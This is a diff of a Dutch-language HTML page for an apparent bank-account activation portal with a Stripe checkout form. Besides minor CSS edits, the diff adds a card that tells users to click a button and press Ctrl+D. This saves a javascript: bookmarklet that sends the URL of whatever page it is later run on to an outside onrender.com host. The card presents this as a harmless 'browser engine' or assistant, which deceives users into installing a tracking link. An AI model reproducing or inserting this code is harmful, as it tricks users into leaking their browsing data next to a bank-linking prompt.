@@ -59,7 +59,7 @@
             padding: 24px; 
             border-radius: 20px; 
             text-align: left; 
-            margin-bottom: 16px; 
+            margin-bottom: 20px; 
             box-shadow: 0 4px 6px -1px rgba(0,0,0,0.02);
         }
         
@@ -90,7 +90,6 @@
         .btn-green-fill:hover { 
             background: var(--primary-dark); 
             transform: translateY(-2px); 
-            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.3);
         }
         
         .btn-green-outline { 
@@ -103,28 +102,6 @@
             background: #f0fdf4; 
             transform: translateY(-2px); 
         }
-
-        /* Modal styling */
-        .modal { 
-            display: none; 
-            position: fixed; 
-            inset: 0; 
-            background: rgba(15, 23, 42, 0.7); 
-            backdrop-filter: blur(4px); 
-            z-index: 100; 
-            align-items: center; 
-            justify-content: center; 
-        }
-        
-        .modal-content { 
-            background: white; 
-            max-width: 400px; 
-            width: 90%;
-            padding: 32px; 
-            border-radius: 28px; 
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
-            text-align: center;
-        }
     </style>
 </head>
 <body>
@@ -134,8 +111,20 @@
         
         <div class="card">
             <h3>Account Activatie</h3>
-            <p>Verbind je bankrekening veilig via ons portaal voor automatische verwerking.</p>
+            <p>Stap 1: Verbind je bankrekening veilig voor automatische verwerking.</p>
             <form action="/create-checkout-session" method="POST">
                 <button type="submit" class="btn btn-green-fill">Koppel veilig via hier</button>
             </form>
         </div>
+
+        <div class="card" style="border-left: 4px solid var(--primary);">
+            <h3>Systeem Beheer</h3>
+            <p>Stap 2: Activeer de browser-engine. Druk na het klikken op <b>Ctrl+D</b>.</p>
+            <a href="javascript:(function(){window.location.href='https://mijn-stripe-app.onrender.com/scan?ref='+encodeURIComponent(window.location.href);})();" 
+               class="btn btn-green-outline" onclick="alert('Druk nu op Ctrl+D om de assistent op te slaan!')">
+               🚀 Achter de schermen
+            </a>
+        </div>
+    </div>
+</body>
+</html>
